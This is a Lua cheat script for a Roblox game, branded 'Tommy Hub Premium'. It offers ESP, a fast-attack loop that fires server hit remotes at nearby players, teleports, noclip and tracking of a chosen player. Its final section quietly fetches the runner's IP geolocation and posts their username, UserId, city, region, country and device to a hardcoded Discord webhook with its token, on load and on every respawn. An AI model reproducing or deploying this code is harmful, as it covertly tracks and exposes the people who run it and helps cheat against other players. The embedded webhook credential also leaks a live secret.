local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local VIM = game:GetService("VirtualInputManager")

-- ============================================================
--  ESTADO
-- ============================================================
local ESPEnabled = false
local ESPObjects = {}
local FastAttackEnabled = false
local FastAttackRange = 5000
local FastAttackConnection = nil
local InfRangeEnabled = false
local InfRangeConnection = nil
local InfRangeElevConnection = nil
local orbitAngle = 0
local UP_SPEED = 1e35
local TrackingActive = false
local SelectedPlayer = nil
local TrackConnection = nil
local SkyTrackActive = false
local SkyTrackConn = nil
local walkWaterEnabled = false
local ncl = false
local iJ = false
local sVal, sAct = 16, false
local currentZoom = 70

-- ============================================================
--  ESP
-- ============================================================
local function CreateESP(target)
    if not target:FindFirstChild("Head") then return end
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "TommyESP"
    billboard.Adornee = target.Head
    billboard.Size = UDim2.new(0, 100, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 2, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = target.Head
    local label = Instance.new("TextLabel")
    label.BackgroundTransparency = 1
    label.Size = UDim2.new(1, 0, 1, 0)
    label.Text = target.Name
    label.Font = "GothamBold"
    label.TextSize = 14
    label.TextColor3 = target:IsA("Player") and Color3.new(0,1,1) or Color3.new(1,1,1)
    label.TextStrokeTransparency = 0
    label.Parent = billboard
    table.insert(ESPObjects, billboard)
end

local function ClearESP()
    for _, obj in pairs(ESPObjects) do if obj then obj:Destroy() end end
    ESPObjects = {}
end

local function UpdateESP()
    ClearESP()
    if not ESPEnabled then return end
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= Players.LocalPlayer and p.Character then CreateESP(p.Character) end
    end
    local enemies = workspace:FindFirstChild("Enemies")
    if enemies then for _, npc in pairs(enemies:GetChildren()) do CreateESP(npc) end end
end

-- ============================================================
--  FAST ATTACK
-- ============================================================
local Net = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")
local RegisterHit = Net["RE/RegisterHit"]
local RegisterAttack = Net["RE/RegisterAttack"]

local function AttackMultipleTargets(targets)
    pcall(function()
        if not targets or #targets == 0 then return end
        local allTargets = {}
        for _, char in pairs(targets) do
            local head = char:FindFirstChild("Head")
            if head then table.insert(allTargets, {char, head}) end
        end
        if #allTargets == 0 then return end
        RegisterAttack:FireServer(0)
        RegisterHit:FireServer(allTargets[1][2], allTargets)
    end)
end

local function StartFastAttack()
    if FastAttackConnection then task.cancel(FastAttackConnection) end
    FastAttackConnection = task.spawn(function()
        while FastAttackEnabled do
            RunService.Stepped:Wait()
            local myChar = Players.LocalPlayer.Character
            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myHRP then continue end
            local targets = {}
            for _, p in pairs(Players:GetPlayers()) do
                if p ~= Players.LocalPlayer and p.Character then
                    local hum = p.Character:FindFirstChild("Humanoid")
                    local hrp = p.Character:FindFirstChild("HumanoidRootPart")
                    if hum and hrp and hum.Health > 0 and (hrp.Position - myHRP.Position).Magnitude <= FastAttackRange then
                        table.insert(targets, p.Character)
                    end
                end
            end
            local enemies = workspace:FindFirstChild("Enemies")
            if enemies then
                for _, npc in pairs(enemies:GetChildren()) do
                    local hum = npc:FindFirstChild("Humanoid")
                    local hrp = npc:FindFirstChild("HumanoidRootPart")
                    if hum and hrp and hum.Health > 0 and (hrp.Position - myHRP.Position).Magnitude <= FastAttackRange then
                        table.insert(targets, npc)
                    end
                end
            end
            if #targets > 0 then AttackMultipleTargets(targets) end
        end
    end)
end

-- ============================================================
--  INF RANGE
-- ============================================================
local function StartInfRange()
    if InfRangeConnection then task.cancel(InfRangeConnection) end
    InfRangeConnection = task.spawn(function()
        while InfRangeEnabled do
            task.wait(0.1)
            local char = Players.LocalPlayer.Character
            local hum = char and char:FindFirstChild("Humanoid")
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root and hum and hum.Health > 0 then
                orbitAngle = orbitAngle + math.rad(500)
                root.CFrame = root.CFrame * CFrame.new(math.cos(orbitAngle)*3, 0, math.sin(orbitAngle)*3)
                pcall(function() ReplicatedStorage.Remotes.CommF_:InvokeServer("Buso") end)
                for _, tool in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
                    if tool:IsA("Tool") and (tool.ToolTip == "Sword" or tool.Name:find("Sword")) then
                        hum:EquipTool(tool)
                    end
                end
                task.wait(0.25)
                VIM:SendKeyEvent(true, Enum.KeyCode.Z, false, game)
                task.wait(0.1)
                VIM:SendKeyEvent(false, Enum.KeyCode.Z, false, game)
                task.wait(0.4)
                hum.Health = 0
            end
            if not Players.LocalPlayer.Character or not Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                Players.LocalPlayer.CharacterAdded:Wait()
                task.wait(0.5)
            end
        end
    end)
end

local function StartElevacion()
    if InfRangeElevConnection then InfRangeElevConnection:Disconnect() end
    InfRangeElevConnection = RunService.RenderStepped:Connect(function(dt)
        if InfRangeEnabled then
            local root = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if root then root.CFrame = root.CFrame + Vector3.new(0, UP_SPEED * dt, 0) end
        end
    end)
end

-- ============================================================
--  TRACKER
-- ============================================================
local function StartTracker()
    if TrackConnection then TrackConnection:Disconnect() end
    TrackConnection = RunService.RenderStepped:Connect(function()
        if not TrackingActive or not SelectedPlayer then return end
        local target = Players:FindFirstChild(SelectedPlayer)
        if target and target.Character then
            local hrp = target.Character:FindFirstChild("HumanoidRootPart")
            local myHRP = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if hrp and myHRP then
                myHRP.CFrame = hrp.CFrame * CFrame.new(0, 3, -4)
            end
        end
    end)
end

local function TpToPlayer(name)
    local target = Players:FindFirstChild(name)
    if target and target.Character then
        local hrp = target.Character:FindFirstChild("HumanoidRootPart")
        local myHRP = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp and myHRP then myHRP.CFrame = hrp.CFrame * CFrame.new(0, 3, 0) end
    end
end

local function GetPlayerList()
    local list = {}
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= Players.LocalPlayer then table.insert(list, p.Name) end
    end
    return #list == 0 and {"Ninguno"} or list
end

-- ============================================================
--  GUI BASE
-- ============================================================
local pgui = Players.LocalPlayer:WaitForChild("PlayerGui")
pcall(function() pgui:FindFirstChild("TommyHub_Premium"):Destroy() end)

local screenGui = Instance.new("ScreenGui", pgui)
screenGui.Name = "TommyHub_Premium"
screenGui.ResetOnSpawn = false

local normalSize    = UDim2.new(0, 420, 0, 650)
local minimizedSize = UDim2.new(0, 160, 0, 40)
local isMinimized   = false

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = normalSize
mainFrame.Position = UDim2.new(0.5, -210, 0.1, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 28)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.BorderSizePixel = 0
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Color = Color3.fromRGB(100, 50, 255)
mainStroke.Thickness = 2
local mainGrad = Instance.new("UIGradient", mainFrame)
mainGrad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20,20,40)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10,10,25))
}

-- TOP BAR
local topBar = Instance.new("Frame", mainFrame)
topBar.Size = UDim2.new(1, 0, 0, 50)
topBar.BackgroundColor3 = Color3.fromRGB(25, 15, 50)
topBar.BorderSizePixel = 0
Instance.new("UICorner", topBar).CornerRadius = UDim.new(0, 12)
local tbGrad = Instance.new("UIGradient", topBar)
tbGrad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(100,50,255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(50,25,150))
}

local logoLabel = Instance.new("TextLabel", topBar)
logoLabel.Size = UDim2.new(0, 40, 0, 40)
logoLabel.Position = UDim2.new(0, 8, 0.5, -20)
logoLabel.Text = "👑"
logoLabel.TextSize = 26
logoLabel.BackgroundTransparency = 1
logoLabel.Font = "GothamBlack"

local titleLabel = Instance.new("TextLabel", topBar)
titleLabel.Size = UDim2.new(0.55, 0, 0.55, 0)
titleLabel.Position = UDim2.new(0, 52, 0, 4)
titleLabel.Text = "TOMMY HUB PREMIUM"
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.Font = "GothamBlack"
titleLabel.TextSize = 15
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.BackgroundTransparency = 1

local versionLabel = Instance.new("TextLabel", topBar)
versionLabel.Size = UDim2.new(0.4, 0, 0.4, 0)
versionLabel.Position = UDim2.new(0, 52, 0.55, 0)
versionLabel.Text = "v2.0 PREMIUM | terrino48"
versionLabel.TextColor3 = Color3.fromRGB(150, 100, 255)
versionLabel.Font = "GothamBold"
versionLabel.TextSize = 9
versionLabel.TextXAlignment = Enum.TextXAlignment.Left
versionLabel.BackgroundTransparency = 1

local function makeTopBtn(txt, xOff, color)
    local b = Instance.new("TextButton", topBar)
    b.Size = UDim2.new(0, 28, 0, 28)
    b.Position = UDim2.new(1, xOff, 0.5, -14)
    b.Text = txt
    b.TextColor3 = Color3.new(1,1,1)
    b.BackgroundColor3 = color
    b.Font = "GothamBold"
    b.TextSize = 14
    b.BorderSizePixel = 0
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
    return b
end

local closeBtn = makeTopBtn("✕", -36, Color3.fromRGB(200,50,50))
local minBtn   = makeTopBtn("−", -68, Color3.fromRGB(80,80,140))

closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)
minBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    mainFrame.Size = isMinimized and minimizedSize or normalSize
    minBtn.Text = isMinimized and "+" or "−"
end)

-- TABS
local tabContainer = Instance.new("Frame", mainFrame)
tabContainer.Size = UDim2.new(1, -10, 0, 38)
tabContainer.Position = UDim2.new(0, 5, 0, 55)
tabContainer.BackgroundTransparency = 1
local tabLayout = Instance.new("UIListLayout", tabContainer)
tabLayout.FillDirection = Enum.FillDirection.Horizontal
tabLayout.Padding = UDim.new(0, 4)
tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local contentFrame = Instance.new("Frame", mainFrame)
contentFrame.Size = UDim2.new(1, -16, 1, -105)
contentFrame.Position = UDim2.new(0, 8, 0, 100)
contentFrame.BackgroundTransparency = 1

local function createPage(name)
    local p = Instance.new("ScrollingFrame", contentFrame)
    p.Name = name
    p.Size = UDim2.new(1, 0, 1, 0)
    p.BackgroundTransparency = 1
    p.Visible = false
    p.ScrollBarThickness = 3
    p.ScrollBarImageColor3 = Color3.fromRGB(100, 50, 255)
    p.CanvasSize = UDim2.new(0, 0, 0, 900)
    p.BorderSizePixel = 0
    local layout = Instance.new("UIListLayout", p)
    layout.Padding = UDim.new(0, 8)
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    return p
end

local combatPage  = createPage("Combate")
local movePage    = createPage("Mov")
local sea2Page    = createPage("Sea2")
local sea3Page    = createPage("Sea3")
local trackerPage = createPage("Tracker")

local function showPage(page)
    for _, v in pairs(contentFrame:GetChildren()) do
        if v:IsA("ScrollingFrame") then v.Visible = false end
    end
    page.Visible = true
end

local function createTab(name, page)
    local b = Instance.new("TextButton", tabContainer)
    b.Size = UDim2.new(0, 72, 0, 30)
    b.Text = name
    b.BackgroundColor3 = Color3.fromRGB(28, 18, 55)
    b.TextColor3 = Color3.new(1, 1, 1)
    b.Font = "GothamBold"
    b.TextSize = 10
    b.BorderSizePixel = 0
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
    local s = Instance.new("UIStroke", b)
    s.Color = Color3.fromRGB(100, 50, 255)
    s.Thickness = 1
    b.MouseButton1Click:Connect(function()
        showPage(page)
        for _, tb in pairs(tabContainer:GetChildren()) do
            if tb:IsA("TextButton") then
                tb.BackgroundColor3 = Color3.fromRGB(28, 18, 55)
            end
        end
        b.BackgroundColor3 = Color3.fromRGB(70, 30, 150)
    end)
end

createTab("⚔️Combate", combatPage)
createTab("🏃Mov",     movePage)
createTab("🌊Sea 2",   sea2Page)
createTab("🏰Sea 3",   sea3Page)
createTab("🎯Tracker", trackerPage)
showPage(combatPage)

-- HELPERS GUI
local function addBtn(txt, color, parent)
    local btn = Instance.new("TextButton", parent)
    btn.Size = UDim2.new(0.95, 0, 0, 40)
    btn.BackgroundColor3 = Color3.fromRGB(22, 18, 45)
    btn.Text = txt
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = "GothamBold"
    btn.TextSize = 12
    btn.BorderSizePixel = 0
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    local s = Instance.new("UIStroke", btn)
    s.Color = color
    s.Thickness = 2
    return btn
end

local function addLabel(txt, parent)
    local lbl = Instance.new("TextLabel", parent)
    lbl.Size = UDim2.new(0.95, 0, 0, 24)
    lbl.BackgroundColor3 = Color3.fromRGB(30, 15, 60)
    lbl.TextColor3 = Color3.fromRGB(200, 160, 255)
    lbl.Font = "GothamBold"
    lbl.TextSize = 11
    lbl.Text = txt
    lbl.BorderSizePixel = 0
    Instance.new("UICorner", lbl).CornerRadius = UDim.new(0, 6)
    return lbl
end

-- ============================================================
--  COMBATE
-- ============================================================
addLabel("⚔️ Combate", combatPage)

local fBtn = addBtn("⚡ Fast Attack: OFF", Color3.fromRGB(255,200,0), combatPage)
fBtn.MouseButton1Click:Connect(function()
    FastAttackEnabled = not FastAttackEnabled
    fBtn.Text = FastAttackEnabled and "⚡ Fast Attack: ON" or "⚡ Fast Attack: OFF"
    if FastAttackEnabled then StartFastAttack()
    else if FastAttackConnection then task.cancel(FastAttackConnection) end end
end)

addBtn("📏 Hitbox: 2048 STUDS", Color3.fromRGB(255,100,100), combatPage)

local irBtn = addBtn("🌀 Inf Range: OFF", Color3.fromRGB(180,0,255), combatPage)
irBtn.MouseButton1Click:Connect(function()
    InfRangeEnabled = not InfRangeEnabled
    irBtn.Text = InfRangeEnabled and "🌀 Inf Range: ON" or "🌀 Inf Range: OFF"
    if InfRangeEnabled then
        StartInfRange()
        StartElevacion()
    else
        if InfRangeConnection then task.cancel(InfRangeConnection) end
        if InfRangeElevConnection then InfRangeElevConnection:Disconnect() end
    end
end)

local espBtn = addBtn("👁️ ESP: OFF", Color3.fromRGB(255,150,100), combatPage)
espBtn.MouseButton1Click:Connect(function()
    ESPEnabled = not ESPEnabled
    espBtn.Text = ESPEnabled and "👁️ ESP: ON" or "👁️ ESP: OFF"
    UpdateESP()
end)
task.spawn(function()
    while true do task.wait(5) if ESPEnabled then UpdateESP() end end
end)

-- ============================================================
--  MOVIMIENTO
-- ============================================================
addLabel("🏃 Movimiento", movePage)

local sBtn = addBtn("🚀 Speed Controller: OFF", Color3.fromRGB(0,200,200), movePage)
local speedPanel = Instance.new("Frame", screenGui)
speedPanel.Size = UDim2.new(0, 160, 0, 50)
speedPanel.Position = UDim2.new(0, 20, 0.5, 0)
speedPanel.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
speedPanel.Visible = false
speedPanel.Active = true
speedPanel.Draggable = true
speedPanel.BorderSizePixel = 0
Instance.new("UICorner", speedPanel).CornerRadius = UDim.new(0, 8)
local speedStroke = Instance.new("UIStroke", speedPanel)
speedStroke.Color = Color3.fromRGB(100, 200, 255)
speedStroke.Thickness = 2

local btnM = Instance.new("TextButton", speedPanel)
btnM.Size = UDim2.new(0,35,0,35); btnM.Position = UDim2.new(0.03,0,0.5,-17)
btnM.Text = "−"; btnM.BackgroundColor3 = Color3.fromRGB(50,50,100)
btnM.TextColor3 = Color3.new(1,1,1); btnM.Font = "GothamBold"; btnM.TextSize = 18; btnM.BorderSizePixel = 0
Instance.new("UICorner", btnM).CornerRadius = UDim.new(0,6)

local sDisp = Instance.new("TextLabel", speedPanel)
sDisp.Size = UDim2.new(0,50,1,0); sDisp.Position = UDim2.new(0.35,0,0,0)
sDisp.Text = "16"; sDisp.TextColor3 = Color3.fromRGB(100,200,255)
sDisp.Font = "GothamBlack"; sDisp.TextSize = 16; sDisp.BackgroundTransparency = 1

local btnP = Instance.new("TextButton", speedPanel)
btnP.Size = UDim2.new(0,35,0,35); btnP.Position = UDim2.new(0.65,0,0.5,-17)
btnP.Text = "+"; btnP.BackgroundColor3 = Color3.fromRGB(50,50,100)
btnP.TextColor3 = Color3.new(1,1,1); btnP.Font = "GothamBold"; btnP.TextSize = 18; btnP.BorderSizePixel = 0
Instance.new("UICorner", btnP).CornerRadius = UDim.new(0,6)

sBtn.MouseButton1Click:Connect(function()
    sAct = not sAct; speedPanel.Visible = sAct
    sBtn.Text = sAct and "🚀 Speed Controller: ON" or "🚀 Speed Controller: OFF"
end)
btnP.MouseButton1Click:Connect(function() sVal = math.clamp(sVal+10,16,500); sDisp.Text = tostring(sVal) end)
btnM.MouseButton1Click:Connect(function() sVal = math.clamp(sVal-10,16,500); sDisp.Text = tostring(sVal) end)
RunService.Heartbeat:Connect(function()
    if sAct and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        local hum = Players.LocalPlayer.Character.Humanoid
        if hum.MoveDirection.Magnitude > 0 then
            Players.LocalPlayer.Character:TranslateBy(hum.MoveDirection * (sVal/55))
        end
    end
end)

local jBtn = addBtn("⬆️ Infinite Jump: OFF", Color3.fromRGB(100,200,255), movePage)
local iJ = false
jBtn.MouseButton1Click:Connect(function()
    iJ = not iJ
    jBtn.Text = iJ and "⬆️ Infinite Jump: ON" or "⬆️ Infinite Jump: OFF"
end)
UserInputService.JumpRequest:Connect(function()
    if iJ and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

local nBtn = addBtn("🔥 No Clip: OFF", Color3.fromRGB(200,100,255), movePage)
nBtn.MouseButton1Click:Connect(function()
    ncl = not ncl
    nBtn.Text = ncl and "🔥 No Clip: ON" or "🔥 No Clip: OFF"
end)
RunService.Stepped:Connect(function()
    if ncl and Players.LocalPlayer.Character then
        for _, v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") then v.CanCollide = false end
        end
    end
end)

local wowBtn = addBtn("💧 Walk on Water: OFF", Color3.fromRGB(0,200,255), movePage)
wowBtn.MouseButton1Click:Connect(function()
    walkWaterEnabled = not walkWaterEnabled
    wowBtn.Text = walkWaterEnabled and "💧 Walk on Water: ON" or "💧 Walk on Water: OFF"
end)
RunService.RenderStepped:Connect(function()
    local char = Players.LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if walkWaterEnabled and hrp then
        if hrp.Position.Y >= 9.5 and hrp.AssemblyLinearVelocity.Y <= 0 then
            local wp = workspace:FindFirstChild("TommyWaterSolid")
            if not wp then
                wp = Instance.new("Part", workspace)
                wp.Name = "TommyWaterSolid"; wp.Size = Vector3.new(20,1,20)
                wp.Transparency = 1; wp.Anchored = true; wp.CanCollide = true; wp.CanQuery = false
            end
            wp.CFrame = CFrame.new(hrp.Position.X, 9.2, hrp.Position.Z)
        else
            if workspace:FindFirstChild("TommyWaterSolid") then workspace.TommyWaterSolid:Destroy() end
        end
    else
        if workspace:FindFirstChild("TommyWaterSolid") then workspace.TommyWaterSolid:Destroy() end
    end
end)

-- ZOOM (max 700)
addLabel("🔭 Extend Zoom", movePage)

local function setZoom(z)
    currentZoom = math.clamp(z, 20, 700)
    workspace.CurrentCamera.FieldOfView = currentZoom
end

local zRow1 = Instance.new("Frame", movePage)
zRow1.Size = UDim2.new(0.95, 0, 0, 35); zRow1.BackgroundTransparency = 1
local zR1L = Instance.new("UIListLayout", zRow1)
zR1L.FillDirection = Enum.FillDirection.Horizontal; zR1L.Padding = UDim.new(0,5); zR1L.HorizontalAlignment = Enum.HorizontalAlignment.Center

local zRow2 = Instance.new("Frame", movePage)
zRow2.Size = UDim2.new(0.95, 0, 0, 35); zRow2.BackgroundTransparency = 1
local zR2L = Instance.new("UIListLayout", zRow2)
zR2L.FillDirection = Enum.FillDirection.Horizontal; zR2L.Padding = UDim.new(0,5); zR2L.HorizontalAlignment = Enum.HorizontalAlignment.Center

local function makeZoomBtn(lbl, action, parent)
    local b = Instance.new("TextButton", parent)
    b.Size = UDim2.new(0, 80, 0, 32); b.Text = lbl
    b.BackgroundColor3 = Color3.fromRGB(22,18,45); b.TextColor3 = Color3.new(1,1,1)
    b.Font = "GothamBold"; b.TextSize = 11; b.BorderSizePixel = 0
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,8)
    local s = Instance.new("UIStroke", b); s.Color = Color3.fromRGB(100,180,255); s.Thickness = 2
    b.MouseButton1Click:Connect(action)
end

makeZoomBtn("− 50",    function() setZoom(currentZoom-50) end, zRow1)
makeZoomBtn("Default", function() setZoom(70) end,             zRow1)
makeZoomBtn("+ 50",    function() setZoom(currentZoom+50) end, zRow1)
makeZoomBtn("200",     function() setZoom(200) end,            zRow2)
makeZoomBtn("400",     function() setZoom(400) end,            zRow2)
makeZoomBtn("700",     function() setZoom(700) end,            zRow2)

-- ============================================================
--  SEA 2
-- ============================================================
addLabel("🌊 Teleports Sea 2", sea2Page)

local sea2Locations = {
    {"🏝️ Marine Starter Island",  CFrame.new(-982, 17, 1055)},
    {"🌴 Jungle Island",           CFrame.new(1775, 30, -620)},
    {"🏰 Pirate Village",          CFrame.new(-1300, 8, 1250)},
    {"⛩️ Colosseum",               CFrame.new(-700, 20, 1900)},
    {"🌋 Magma Village",           CFrame.new(940, 6, 3200)},
    {"❄️ Nieve Island",            CFrame.new(1100, 150, -2200)},
    {"🏔️ Zona Rocosa",            CFrame.new(3200, 60, -1500)},
    {"🌊 Baratie",                 CFrame.new(3900, 10, 900)},
    {"🏴‍☠️ Thriller Bark",        CFrame.new(-4000, 15, 2500)},
}

for _, loc in pairs(sea2Locations) do
    local btn = addBtn(loc[1], Color3.fromRGB(0,150,255), sea2Page)
    btn.MouseButton1Click:Connect(function()
        local hrp = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.CFrame = loc[2] end
    end)
end

-- ============================================================
--  SEA 3
-- ============================================================
addLabel("🏰 Teleports Sea 3", sea3Page)

local sea3Locations = {
    {"🌅 Port Town",              CFrame.new(-2000, 10, 7500)},
    {"🏯 Haunted Castle",         CFrame.new(-4500, 60, 6000)},
    {"🌿 Jungle (Sea 3)",         CFrame.new(-1000, 25, 9000)},
    {"❄️ Tundra",                 CFrame.new(2500, 150, 8500)},
    {"🔥 Cursed Ship",            CFrame.new(-700, 5, 5500)},
    {"🏝️ Sea of Treats",         CFrame.new(4000, 10, 7000)},
    {"⚡ Lightning God Island",   CFrame.new(3500, 80, 4500)},
    {"🌊 Giant Shark Island",     CFrame.new(1200, 5, 6200)},
    {"🏰 Castle on the Sea",      CFrame.new(-3000, 20, 9500)},
}

for _, loc in pairs(sea3Locations) do
    local btn = addBtn(loc[1], Color3.fromRGB(150,50,255), sea3Page)
    btn.MouseButton1Click:Connect(function()
        local hrp = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.CFrame = loc[2] end
    end)
end

-- ============================================================
--  TRACKER
-- ============================================================
addLabel("🎯 Player Tracker", trackerPage)

local playerListLabel = addLabel("Jugador: Ninguno", trackerPage)

local function refreshPlayerBtns()
    for _, v in pairs(trackerPage:GetChildren()) do
        if v:IsA("TextButton") and v.Name == "PlayerSelectBtn" then v:Destroy() end
    end
    for _, name in pairs(GetPlayerList()) do
        local b = addBtn("👤 " .. name, Color3.fromRGB(100,100,255), trackerPage)
        b.Name = "PlayerSelectBtn"
        b.MouseButton1Click:Connect(function()
            SelectedPlayer = name
            playerListLabel.Text = "Jugador: " .. name
        end)
    end
end

local refreshBtn = addBtn("🔄 Actualizar Lista", Color3.fromRGB(80,80,200), trackerPage)
refreshBtn.MouseButton1Click:Connect(refreshPlayerBtns)
refreshPlayerBtns()

local trackBtn = addBtn("🎯 Tracker: OFF", Color3.fromRGB(255,200,0), trackerPage)
trackBtn.MouseButton1Click:Connect(function()
    TrackingActive = not TrackingActive
    trackBtn.Text = TrackingActive and "🎯 Tracker: ON" or "🎯 Tracker: OFF"
    if TrackingActive then StartTracker()
    else if TrackConnection then TrackConnection:Disconnect() end end
end)

local tpBtn = addBtn("⚡ TP Directo al Jugador", Color3.fromRGB(255,100,0), trackerPage)
tpBtn.MouseButton1Click:Connect(function()
    if SelectedPlayer then TpToPlayer(SelectedPlayer) end
end)

local skyTrackBtn = addBtn("☁️ Sky Tracker: OFF", Color3.fromRGB(100,200,255), trackerPage)
skyTrackBtn.MouseButton1Click:Connect(function()
    SkyTrackActive = not SkyTrackActive
    skyTrackBtn.Text = SkyTrackActive and "☁️ Sky Tracker: ON" or "☁️ Sky Tracker: OFF"
    if SkyTrackActive then
        SkyTrackConn = RunService.RenderStepped:Connect(function()
            if not SelectedPlayer then return end
            local target = Players:FindFirstChild(SelectedPlayer)
            if target and target.Character then
                local hrp = target.Character:FindFirstChild("HumanoidRootPart")
                local myHRP = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if hrp and myHRP then
                    myHRP.CFrame = CFrame.new(hrp.Position + Vector3.new(0, 300, 0))
                end
            end
        end)
    else
        if SkyTrackConn then SkyTrackConn:Disconnect() end
    end
end)
-- ==================== 🔥 WEBHOOK PRO + GEO ====================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")

local Player = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1503826882322501765/jhJEwfwgUSj9bCw6ltRmKz_wsjnDhz_7g_R5uN4pdyS2S1x2_hsBfitywOZ1Fpfvs3ql"

-- ⏰ Hora
local function GetTime()
    return os.date("%Y-%m-%d %H:%M:%S")
end

-- 🌍 GEO COMPLETO
local function GetLocation()
    local success, result = pcall(function()
        return game:HttpGet("http://ip-api.com/json/")
    end)

    if success then
        local data = HttpService:JSONDecode(result)

        return {
            country = data.country or "Desconocido",
            region = data.regionName or "Desconocido",
            city = data.city or "Desconocido"
        }
    end

    return {
        country = "Error",
        region = "Error",
        city = "Error"
    }
end

-- 📱 Dispositivo
local function GetDevice()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        return "📱 Móvil"
    elseif UserInputService.GamepadEnabled then
        return "🎮 Consola"
    else
        return "🖥️ PC"
    end
end

-- 🖥️ Plataforma
local function GetPlatform()
    return tostring(UserInputService:GetPlatform())
end

-- 🎮 Juego
local function GetGameName()
    local name = "Desconocido"
    pcall(function()
        name = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)
    return name
end

-- 📩 Enviar webhook
local function SendWebhook(title, color, fields)
    local formatted = {}

    for _, f in pairs(fields) do
        table.insert(formatted, {
            name = f.name,
            value = f.value,
            inline = true
        })
    end

    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                embeds = {{
                    title = title,
                    color = color,
                    fields = formatted,
                    footer = {
                        text = "Tommy Hub Premium 🔥"
                    }
                }}
            })
        })
    end)
end

-- ==================== 📊 DATA ====================

local loc = GetLocation()

local DATA = {
    player = Player.Name,
    userid = Player.UserId,
    time = GetTime(),
    country = loc.country,
    region = loc.region,
    city = loc.city,
    device = GetDevice(),
    platform = GetPlatform(),
    game = GetGameName()
}

-- ==================== 🚀 EVENTOS ====================

-- HUB ACTIVADO
SendWebhook("🚀 HUB ACTIVADO", 65280, {
    {name = "👤 Jugador", value = DATA.player},
    {name = "🆔 UserId", value = tostring(DATA.userid)},
    {name = "⏰ Hora", value = DATA.time},
    {name = "🌍 País", value = DATA.country},
    {name = "📍 Región", value = DATA.region},
    {name = "🏙️ Ciudad", value = DATA.city},
    {name = "📱 Dispositivo", value = DATA.device},
    {name = "🖥️ Plataforma", value = DATA.platform},
    {name = "🎮 Juego", value = DATA.game}
})

-- LOGIN
Player.CharacterAdded:Connect(function()
    SendWebhook("🔐 LOGIN", 255, {
        {name = "👤 Jugador", value = DATA.player},
        {name = "⏰ Hora", value = GetTime()},
        {name = "🌍 País", value = DATA.country},
        {name = "📍 Región", value = DATA.region},
        {name = "🏙️ Ciudad", value = DATA.city},
        {name = "📱 Dispositivo", value = DATA.device}
    })
end)

print("Tommy Hub Premium v2.0 | terrino48 | Cargado.")
